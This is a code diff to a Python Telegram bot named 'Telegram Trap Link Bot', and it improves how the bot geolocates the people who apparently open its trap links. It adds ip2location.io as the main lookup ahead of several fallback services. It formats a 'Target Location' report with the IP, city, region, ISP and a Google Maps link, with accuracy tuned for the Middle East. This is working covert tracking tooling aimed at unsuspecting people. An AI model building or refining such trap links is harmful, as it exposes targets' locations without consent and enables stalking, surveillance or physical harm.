@@ -3,7 +3,7 @@ Telegram Trap Link Bot v8.0 — RAILWAY DEPLOYMENT
 - ✅ Works on Railway + localhost
 - ✅ Polling mode (no webhook conflicts)
 - ✅ ALL functionality preserved
-- ✅ Accurate IP geolocation with ipinfo.io
+- ✅ Accurate IP geolocation with ip2location.io + ipinfo.io
 """
 
 import os
@@ -126,7 +126,7 @@ def get_ip_address():
 
 
 def get_geo_info(ip_address):
-    """Get geolocation using ipinfo.io (more accurate for Middle East)."""
+    """Get geolocation using ip2location.io (most accurate for Middle East)."""
     try:
         # Handle local IPs
         if ip_address in ['127.0.0.1', '::1', 'localhost', '0.0.0.0'] or \
@@ -138,7 +138,33 @@ def get_geo_info(ip_address):
                 "org": "", "mobile": False, "proxy": False, "hosting": False
             }
 
-        # PRIMARY: Use ipinfo.io (best accuracy for Middle East)
+        # PRIMARY: Use ip2location.io (most accurate for Middle East)
+        try:
+            resp = requests.get(
+                f"https://api.ip2location.io/?ip={ip_address}&format=json",
+                headers={"User-Agent": "TrapLinkBot/1.0"},
+                timeout=5
+            )
+            if resp.status_code == 200:
+                data = resp.json()
+                if data.get("country_name"):
+                    return {
+                        "ip": ip_address,
+                        "country": data.get("country_name", "Unknown"),
+                        "city": data.get("city_name", "Unknown"),
+                        "region": data.get("region_name", "Unknown"),
+                        "lat": float(data.get("latitude", 0)),
+                        "lon": float(data.get("longitude", 0)),
+                        "isp": data.get("isp", "Unknown"),
+                        "org": data.get("isp", ""),
+                        "mobile": False,
+                        "proxy": False,
+                        "hosting": False
+                    }
+        except Exception as e:
+            logger.warning(f"ip2location failed for {ip_address}: {e}")
+
+        # FALLBACK 1: ipinfo.io
         try:
             resp = requests.get(
                 f"https://ipinfo.io/{ip_address}/json",
@@ -147,37 +173,25 @@ def get_geo_info(ip_address):
             )
             if resp.status_code == 200:
                 data = resp.json()
-                
-                # Check if it's a private IP (bogon)
-                if data.get("bogon"):
+                if not data.get("bogon"):
+                    loc = data.get("loc", "0,0").split(",")
                     return {
-                        "ip": ip_address, "country": "Local", "city": "Localhost",
-                        "region": "Local", "lat": 0, "lon": 0, "isp": "Local Network",
-                        "org": "", "mobile": False, "proxy": False, "hosting": False
+                        "ip": ip_address,
+                        "country": data.get("country", "Unknown"),
+                        "city": data.get("city", "Unknown"),
+                        "region": data.get("region", "Unknown"),
+                        "lat": float(loc[0]) if len(loc) > 0 and loc[0] else 0,
+                        "lon": float(loc[1]) if len(loc) > 1 and loc[1] else 0,
+                        "isp": data.get("org", "Unknown"),
+                        "org": data.get("org", ""),
+                        "mobile": False,
+                        "proxy": False,
+                        "hosting": False
                     }
-                
-                # Parse location (lat,lon)
-                loc = data.get("loc", "0,0").split(",")
-                lat = float(loc[0]) if len(loc) > 0 and loc[0] else 0
-                lon = float(loc[1]) if len(loc) > 1 and loc[1] else 0
-                
-                return {
-                    "ip": ip_address,
-                    "country": data.get("country", "Unknown"),
-                    "city": data.get("city", "Unknown"),
-                    "region": data.get("region", "Unknown"),
-                    "lat": lat,
-                    "lon": lon,
-                    "isp": data.get("org", "Unknown"),
-                    "org": data.get("org", ""),
-                    "mobile": False,
-                    "proxy": False,
-                    "hosting": False
-                }
         except Exception as e:
             logger.warning(f"ipinfo failed for {ip_address}: {e}")
 
-        # FALLBACK 1: freeipapi.com
+        # FALLBACK 2: freeipapi.com
         try:
             resp = requests.get(
                 f"https://freeipapi.com/api/json/{ip_address}",
@@ -202,7 +216,7 @@ def get_geo_info(ip_address):
         except Exception as e:
             logger.warning(f"freeipapi failed for {ip_address}: {e}")
 
-        # FALLBACK 2: ip-api.com
+        # FALLBACK 3: ip-api.com
         try:
             resp = requests.get(
                 f"http://ip-api.com/json/{ip_address}?fields=status,message,query,country,city,lat,lon,isp,org,mobile,proxy,hosting",
@@ -241,10 +255,16 @@ def format_geo_message(geo):
     """Format geolocation into a rich Telegram message."""
     flag = "🛡️" if geo.get("proxy") else ("🏢" if geo.get("hosting") else "📍")
     maps_url = f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}" if geo['lat'] and geo['lon'] else None
+    
+    # Try to show more accurate location
+    location_name = geo.get('city', 'N/A')
+    if location_name == 'N/A' and geo.get('region'):
+        location_name = geo.get('region', 'N/A')
+    
     msg = (
         f"{flag} *Target Location*\n\n"
         f"🌐 *IP:* `{geo['ip']}`\n"
-        f"🏙️ *City:* {geo.get('city', 'N/A')}\n"
+        f"🏙️ *City:* {location_name}\n"
         f"🌍 *Country:* {geo.get('country', 'N/A')}\n"
         f"📌 *Region:* {geo.get('region', 'N/A')}\n"
         f"🏢 *ISP:* {geo.get('isp', 'N/A')}"
@@ -259,6 +279,11 @@ def format_geo_message(geo):
     if maps_url:
         msg += f"\n\n🗺️ [View on Google Maps]({maps_url})"
         msg += f"\n📌 `{geo['lat']}, {geo['lon']}`"
+    
+    # Add note about accuracy
+    if geo.get('country') in ['United States', 'Netherlands'] and geo.get('city') == 'Unknown':
+        msg += f"\n\n⚠️ *Note:* IP location may be approximate due to ISP routing."
+    
     return msg
 
 
@@ -800,7 +825,7 @@ if __name__ == "__main__":
 ║   ✅ Works on Railway + localhost                            ║
 ║   ✅ Polling mode — no webhook conflicts                     ║
 ║   ✅ ALL functionality preserved                             ║
-║   ✅ Accurate IP geolocation with ipinfo.io                  ║
+║   ✅ Accurate IP geolocation with ip2location.io             ║
 ╚═══════════════════════════════════════════════════════════════╝
     """)
 
